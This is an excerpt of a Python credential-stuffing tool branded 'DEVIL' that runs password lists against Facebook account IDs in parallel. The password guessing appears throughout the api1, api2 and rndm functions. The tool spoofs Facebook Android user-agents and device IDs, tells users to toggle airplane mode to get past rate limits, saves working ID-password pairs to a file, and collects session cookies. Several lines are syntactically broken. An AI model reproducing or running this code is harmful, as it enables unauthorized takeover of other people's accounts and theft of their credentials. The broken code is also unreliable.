...
try:
    ...
    time.sleep(1)
os.system('xdg-open https://t.me/DEVILM166')
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
sys.stdout.write('\x1b]2; DEVIL MX \x07')
logo=("""\033[1;32m
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;32md8888b. d88888b db    db d888888b db      
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;32m88  `8D 88'     88    88   `88'   88      
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;32m88   88 88ooooo Y8    8P    88    88      
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;32m88   88 88~~~~~ `8b  d8'    88    88      
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;32m88  .8D 88.      `8bd8'    .88.   88booo. 
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;32mY8888D' Y88888P    YP    Y888888P Y88888P 
\033[1;37m===========================================
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mAuthor  : \033[1;37mabdo alim
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mGithub  : \033[1;37mDEVIL —M16
...
def menu():
            clear()
        #    linex()
            print(' \33[37;42m\t WELCOME DEVIL TOOL \33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print("\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mDEVIL Has Been Running ") 
                    print("\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane mode after 2 minuter ") 
                    print("\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mIF NO RESUlT \033[1;32m[NO/\033[1;31mOFF] \033[1;37mAIRPLAN MODE ")  
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write(f'\r\r\033[1;37m[DEVIL-M1] [%s| \033[1;32mOK\033[1;37m|\x1b[38;5;205mCP \033[1;32m%s\033[1;37m|\x1b[38;5;205m%s\033[1;37m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 10; M Build/QP1A.396634.789) [FBAN/FB4A;FBAV/214.0.0.22029;[FBAN/FB4A;FBAV/133.0.0.40148;FBPN/com.facebook.katana;FBLC/th_TH;FBBV/83410511;FBCR/ Android;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/{density=5,width=991,height=1480};FB_FW/1;FBRV/15090395;]"+"Dalvik/2.1.0 (Linux; U; Android 10; 5 Build/QP1A.829147.350) [FBAN/FB4A;FBAV/324.0.0.34278;[FBAN/FB4A;FBAV/258.0.0.32159;FBPN/com.facebook.katana;FBLC/ en_GB;FBBV/49578585;FBCR/ vodafone ES;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2,width=973,height=2563};FB_FW/5;FBRV/70689472;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [DEVIL-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/DEVIL/DEVIL-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [DEVIL-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r\033[1;37m[DEVIL-M2] [%s| \033[1;32mOK\033[1;37m|\x1b[38;5;205mCP \033[1;32m%s\033[1;37m|\x1b[38;5;205m%s\033[1;37m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))";Dalvik/2.1.0 (Linux; U; Android 6; 5 Build/QP1A.821689.486) [FBAN/FB4A;FBAV/216.0.0.126274;[FBAN/FB4A;FBAV/36.0.0.34144;FBPN/com.facebook.katana;FBLC/ fr_FR;FBBV/84572487;FBCR/ Yoigo;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=5,width=2226,height=9773};FB_FW/3;FBRV/82415012;]"
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [DEVIL-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 8; 7 Build/QP1A.859721.537) [FBAN/FB4A;FBAV/208.0.0.8077;[FBAN/FB4A;FBAV/181.0.0.57108;FBPN/com.facebook.katana;FBLC/ en_GB;FBBV/35534142;FBCR/ Maxcom;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/{density=1,width=1874,height=5265};FB_FW/9;FBRV/42521431;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [DEVIL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [DEVIL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def main_apv():
    ...
    try:
        ...
        tks = ('Hello%20DEVIL%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)
